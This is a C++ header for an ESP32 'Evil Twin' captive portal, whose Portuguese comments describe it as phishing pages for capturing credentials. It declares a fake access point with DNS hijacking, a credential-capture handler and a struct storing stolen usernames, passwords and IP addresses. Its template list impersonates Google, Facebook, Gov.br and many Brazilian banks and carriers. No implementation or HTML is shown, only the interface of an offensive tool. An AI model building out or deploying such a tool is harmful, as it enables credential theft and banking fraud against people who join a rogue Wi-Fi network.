#pragma once

/**
 * @file captive_portal.h
 * @brief Captive Portal para Evil Twin Attack
 *
 * Implementa páginas de phishing para capturar credenciais
 * em ataques Evil Twin.
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <WiFi.h>
#include <vector>

/**
 * @brief Templates de portal disponíveis
 */
enum PortalTemplate {
  PORTAL_GENERIC = 0,
  PORTAL_GOOGLE,
  PORTAL_FACEBOOK,
  PORTAL_HOTEL,
  PORTAL_AIRPORT,
  PORTAL_CORPORATE,
  PORTAL_NETFLIX,
  PORTAL_STARBUCKS,
  PORTAL_MAGALU,
  PORTAL_CLARO,
  PORTAL_VIVO,
  PORTAL_TIM,
  PORTAL_OI,
  PORTAL_UBER,
  PORTAL_ITAU,
  PORTAL_BRADESCO,
  PORTAL_CORREIOS,
  PORTAL_MCDONALDS,
  PORTAL_INSTAGRAM,
  PORTAL_TIKTOK,
  PORTAL_PSN,
  PORTAL_NUBANK,
  PORTAL_CAIXA,
  PORTAL_BB,
  PORTAL_SANTANDER,
  PORTAL_INTER,
  PORTAL_GOVBR,
  PORTAL_MERCADOLIVRE,
  PORTAL_SHOPEE,
  PORTAL_WHATSAPP
};

/**
 * @brief Credencial capturada
 */
struct CapturedCredential {
  char username[64];
  char password[64];
  char ip_address[16];
  unsigned long timestamp;
};

/**
 * @brief Classe do Captive Portal
 */
class CaptivePortal {
public:
  CaptivePortal();

  /**
   * @brief Inicia o portal cativo
   * @param ssid SSID do AP falso
   * @param template_type Template visual
   */
  bool begin(const char *ssid, PortalTemplate template_type = PORTAL_GENERIC);

  /**
   * @brief Para o portal
   */
  void stop();

  /**
   * @brief Atualiza DNS server (chamar no loop)
   */
  void update();

  /**
   * @brief Verifica se está ativo
   */
  bool isActive() { return _active; }

  /**
   * @brief Obtém credenciais capturadas
   */
  std::vector<CapturedCredential> &getCredentials() { return _credentials; }

  /**
   * @brief Limpa credenciais
   */
  void clearCredentials() { _credentials.clear(); }

  /**
   * @brief Total de clientes conectados
   */
  int getConnectedClients();

private:
  AsyncWebServer *_server;
  DNSServer _dnsServer;
  bool _active;
  PortalTemplate _template;
  std::vector<CapturedCredential> _credentials;

  void setupRoutes();
  String getLoginPage();
  String getSuccessPage();
  void handleCredentials(AsyncWebServerRequest *request);

  // Templates HTML
  static const char *HTML_GENERIC;
  static const char *HTML_GOOGLE;
  static const char *HTML_SUCCESS;
};

extern CaptivePortal captive_portal;
